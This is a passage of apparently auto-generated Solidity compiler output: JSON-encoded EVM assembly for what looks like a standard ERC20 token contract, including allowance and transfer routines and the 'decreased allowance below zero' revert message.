											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 2237,
											"end": 2249,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "tag",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "tag",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "tag",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "tag",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2237,
											"end": 2249,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2158,
											"end": 2256,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4527,
											"end": 4531,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 3
										},
										{
											"begin": 4581,
											"end": 4613,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 4597,
											"end": 4604,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 4606,
											"end": 4612,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 4581,
											"end": 4589,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 4581,
											"end": 4613,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4581,
											"end": 4613,
											"name": "tag",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 4581,
											"end": 4613,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4630,
											"end": 4634,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 4623,
											"end": 4634,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4623,
											"end": 4634,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4623,
											"end": 4634,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "tag",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4444,
											"end": 4641,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5300,
											"end": 5304,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 3
										},
										{
											"begin": 5356,
											"end": 5394,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 5372,
											"end": 5376,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 5387,
											"end": 5393,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 5356,
											"end": 5371,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 5356,
											"end": 5394,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5356,
											"end": 5394,
											"name": "tag",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 5356,
											"end": 5394,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5404,
											"end": 5431,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 5414,
											"end": 5418,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 5420,
											"end": 5422,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 5424,
											"end": 5430,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 5404,
											"end": 5413,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 5404,
											"end": 5431,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5404,
											"end": 5431,
											"name": "tag",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 5404,
											"end": 5431,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5448,
											"end": 5452,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 5448,
											"end": 5452,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 5203,
											"end": 5459,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5203,
											"end": 5459,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "tag",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5854,
											"end": 6088,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5942,
											"end": 5946,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 3
										},
										{
											"begin": 5996,
											"end": 6060,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6012,
											"end": 6019,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 6049,
											"end": 6059,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6046,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 6012,
											"end": 6019,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6030,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 6021,
											"end": 6046,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6046,
											"name": "tag",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 6021,
											"end": 6046,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 6021,
											"end": 6059,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "tag",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 6021,
											"end": 6059,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5996,
											"end": 6004,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 5996,
											"end": 6060,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "tag",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 2369,
											"end": 2471,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2425,
											"end": 2438,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 2457,
											"end": 2464,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2450,
											"end": 2464,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2450,
											"end": 2464,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 2450,
											"end": 2464,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 2450,
											"end": 2464,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2450,
											"end": 2464,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 2450,
											"end": 2464,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "tag",
											"source": 0,
											"value": "52"
										},
										{
											"begin": 6575,
											"end": 7002,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6668,
											"end": 6672,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 3
										},
										{
											"begin": 6668,
											"end": 6672,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6749,
											"end": 6774,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 6766,
											"end": 6773,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 6749,
											"end": 6758,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 6749,
											"end": 6774,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6749,
											"end": 6774,
											"name": "tag",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 6749,
											"end": 6774,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6722,
											"end": 6774,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6722,
											"end": 6774,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6812,
											"end": 6827,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 6792,
											"end": 6808,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6792,
											"end": 6827,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 6792,
											"end": 6827,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3170,
											"end": 3172,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3152,
											"end": 3173,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3209,
											"end": 3211,
											"name": "PUSH",
											"source": 5,
											"value": "25"
										},
										{
											"begin": 3189,
											"end": 3207,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 3189,
											"end": 3207,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3189,
											"end": 3207,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3182,
											"end": 3212,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3248,
											"end": 3282,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77"
										},
										{
											"begin": 3228,
											"end": 3246,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 3228,
											"end": 3246,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3228,
											"end": 3246,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3221,
											"end": 3283,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "207A65726F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "D8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 3299,
											"end": 3317,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 3299,
											"end": 3317,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3299,
											"end": 3317,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3292,
											"end": 3327,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3344,
											"end": 3363,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 3344,
											"end": 3363,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "tag",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "tag",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 6784,
											"end": 6869,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6903,
											"end": 6963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 6912,
											"end": 6917,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6919,
											"end": 6926,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 6947,
											"end": 6962,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 6928,
											"end": 6944,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6928,
											"end": 6962,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6903,
											"end": 6911,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 6903,
											"end": 6963,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "tag",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 3740,
											"end": 3929,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3819,
											"end": 3823,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "CALLER",
											"source": 3
										},
										{
											"begin": 3873,
											"end": 3901,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 719,
											"end": 729,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3890,
											"end": 3892,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 3894,
											"end": 3900,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 3873,
											"end": 3882,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 3873,
											"end": 3901,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "tag",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 3987,
											"end": 4136,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4076,
											"end": 4083,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4113,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4120,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 4102,
											"end": 4129,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3987,
											"end": 4136,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10457,
											"end": 10797,
											"name": "tag",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 10457,
											"end": 10797,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 10558,
											"end": 10577,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10558,
											"end": 10577,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
